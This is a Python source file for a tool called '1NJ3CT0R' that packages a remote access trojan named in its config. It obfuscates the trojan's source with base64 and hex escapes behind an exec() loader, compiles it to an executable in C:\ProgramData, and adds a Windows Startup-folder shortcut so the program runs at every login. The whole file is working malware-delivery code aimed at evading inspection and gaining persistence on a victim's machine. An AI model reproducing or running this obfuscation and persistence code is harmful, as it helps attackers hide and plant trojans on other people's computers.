from glob import glob
from os import system as sys
from os import environ as env
from os import rename, remove 
from os import path as path_
#others imports
from json import load
from time import sleep as slp
from base64 import b64encode
from tkinter import EXCEPTION
from win32com.client import Dispatch
from plyer import notification as ntf
from pystyle import Colors, Write
#locals imports
from helpers import TemporaryDirectory, os_allow
from auto_py_to_exe.packaging import package
from auto_py_to_exe import config as auto_py_to_exe_config

#paths definitions 
startup_path = f"{env['appdata']}\Microsoft\Windows\Start Menu\Programs\Startup"
#windows title
sys(f"title 1NJ3CT0R")

with open("config.json", "r") as f:
    config = load(f)

r= """
 ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
███║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═████╗██╔══██╗
╚██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██╔██║██████╔╝
 ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ████╔╝██║██╔══██╗
 ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║ by crashixx
 ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    shlemmmm
=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~\n"""

#error message
def error(x):
        ntf.notify(
            title='1J3CT0R',
            message=f'ERROR: ({x})...',
            timeout=10
        )

#clear() command 
def clear():
    sys("cls")


#file obfuscator
def obfuscator(f_content):
    OFFSET = 10
    VAR = '__SKID_OO' * 100
    try:
        b64_content = b64encode(f_content.encode()).decode()
        index = 0
        code = f'{VAR} = ""\n'
        for _ in range(int(len(b64_content) / OFFSET) + 1):
            _str = ''
            for char in b64_content[index:index + OFFSET]:
                byte = str(hex(ord(char)))[2:]
                if len(byte) < 2:
                    byte = '0' + byte
                _str += '\\x' + str(byte)
            code += f'{VAR} += "{_str}"\n'
            index += OFFSET
        code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VAR}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
        return code
    except:
        error("Obfuscation")
        pass

#obf file moover
def obf_file(base_path, sfname):
    try:
        with open(base_path, 'r', encoding='utf-8', errors='ignore') as file:
            f_content = file.read()
        obfuscated_content = obfuscator(f_content)
        remove(base_path)
        with open(f'{sfname}', 'w') as file:
            file.write(obfuscated_content)
    except Exception as e:
        input(e)
        error("Obfuscation")
        exit()

#convert file (py) to exe

def exe(sfname, logopath):
    global output_folder
    try:
        path = f'C:\\ProgramData\\{sfname}'
        rpath = r"{}".format(path)
        
        with TemporaryDirectory() as build_directory:
            auto_py_to_exe_config.temporary_directory = build_directory

            with TemporaryDirectory() as output_directory:
                pyinstaller_command = f'pyinstaller {sfname}.py --noconfirm --onedir --nowindowed --distpath {rpath} --icon {logopath}'
                options = {
                    'increaseRecursionLimit': False,
                    'outputDirectory': output_directory
                }

                success = package(pyinstaller_command, options)
                assert success
                output_folder = output_directory
    except Exception as e:
        input(e)
        error("Compiler")
        exit()


#create shortcut in startup
def shortcut(x, app_name):
    global output_folder
    try:
        shortcut_path = path_.join(x, f'{app_name}.lnk')
        target = f"{output_folder}\\{app_name}\\{app_name}.exe" 
        icon = f"{output_folder}\\{app_name}\\{app_name}.exe" 
        shell = Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.IconLocation = icon
        shortcut.save()
    except:
        error("Shortcut")
        exit()

#injector main
def injector(startup_path, base_path, sfname, logopath):
    obf_file(base_path, sfname)
    exe(sfname, logopath)
    rename(base_path, sfname)
    shortcut(startup_path, sfname)
    clear()
    Write.Input(f"""{r}-> File succefuly created in C:\ProgramData\{sfname}.exe ! 
-> Shortcut succefuly created in startup folder !
-> Done ;) !
Press enter to exit...""", Colors.red, interval=0)

#main code
def main():
    characters = """ '," """

    fname = config["rat_name"]
    sfname= fname.replace(" ", "_")

    if fname=="":
        fname="Error"
        error("Invalid file name ")
        exit()         
    else: 
        pass
    
    #file base path set
    path = config["rat_path"]
    try:
        if path=="":
            error("Invalid path")
            exit()
        else:
            base_path = ''.join( x for x in path if x not in characters)
    except:
        error("Set Path")
        exit()
    
    #logo path set 
    logo = config["logo_path"]
    if logo == "":
        error("Invalid Logo")
        exit()
    else:
        logopath = ''.join( x for x in logo if x not in characters)

    #file infos verifications before convert and inject                                                                          
    Write.Input(f"""{r}File Infos :
> File path: {base_path}
> Logo Path: {logopath}
> Final file name: {fname}.exe
> Final file path: C:\ProgramData\{sfname}.exe
> Final shortcut path: {startup_path}\{sfname}.exe
Press enter to start the injection....""", Colors.red, interval=0)
    #injection starter
    try:
        sys("cls")
        sys("color C")
        injector(startup_path, base_path, sfname, logopath)
    except:
        sys("cls")
        error("Fatal Error.. Please retry")
        Write.Input("\nby CR4SH3D © | An Error was ocurred, Please try again...", Colors.red, interval=0)
        exit()

main()